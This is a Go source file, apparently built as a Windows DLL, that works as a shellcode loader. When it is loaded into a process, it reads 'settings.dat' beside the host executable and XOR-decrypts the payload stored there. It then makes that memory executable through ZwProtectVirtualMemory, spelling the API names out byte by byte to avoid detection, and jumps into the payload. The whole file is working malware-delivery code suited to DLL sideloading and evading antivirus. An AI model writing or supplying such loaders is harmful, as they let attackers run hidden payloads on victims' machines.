package main

import "C"

import (
	"bytes"
	"encoding/binary"
	"io/ioutil"
	"os"
	"path/filepath"
	"unsafe"

	"syscall"
)

const (
	PAGE_EXECUTE_READ uintptr = 0x20
)

var (
	embedShellcode = false
	shellcodeFile  = "settings.dat"
)

/*
NTSTATUS
NtProtectVirtualMemory(
  IN HANDLE,
  IN OUT PVOID*,
  IN OUT SIZE_T*,
  IN ULONG,
  OUT PULONG
)
*/
// 执行shellcode
// inspired by: https://github.com/EddieIvan01/gld/blob/master/loader/loader.go
func X(buf []byte) {
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	syscall.NewLazyDLL(string([]byte{
		'n', 't', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(
		hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&dwOldPerm)),
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}

// XorEncryptDecrypt 异或加解密
func XorEncryptDecrypt(input, key []byte) (output []byte) {
	for i := 0; i < len(input); i++ {
		output = append(output, byte(input[i]^key[i%len(key)]))
	}
	return output
}

func E(shellcodeFilepath string) {
	shellcodeData, err := ioutil.ReadFile(shellcodeFilepath)
	if err != nil {
		panic(err)
	}
	shellcodeReader := bytes.NewReader(shellcodeData)
	var keyLen int64
	err = binary.Read(shellcodeReader, binary.LittleEndian, &keyLen)
	if err != nil {
		panic(err)
	}
	var key = make([]byte, keyLen)
	err = binary.Read(shellcodeReader, binary.LittleEndian, key)
	if err != nil {
		panic(err)
	}
	var shellcodeLen int64
	err = binary.Read(shellcodeReader, binary.LittleEndian, &shellcodeLen)
	if err != nil {
		panic(err)
	}
	var shellcodeE = make([]byte, shellcodeLen)
	err = binary.Read(shellcodeReader, binary.LittleEndian, shellcodeE)
	if err != nil {
		panic(err)
	}
	shellcode := XorEncryptDecrypt(shellcodeE, key)
	X(shellcode)
}

// OnProcessAttach is an async callback (hook).
//export OnProcessAttach
func OnProcessAttach(
	hinstDLL unsafe.Pointer, // handle to DLL module
	fdwReason uint32, // reason for calling function
	lpReserved unsafe.Pointer, // reserved
) {
	ex, _ := os.Executable()
	exPath := filepath.Dir(ex)
	E(filepath.Join(exPath, shellcodeFile))
}

func main() {
	// nothing really. xD
}
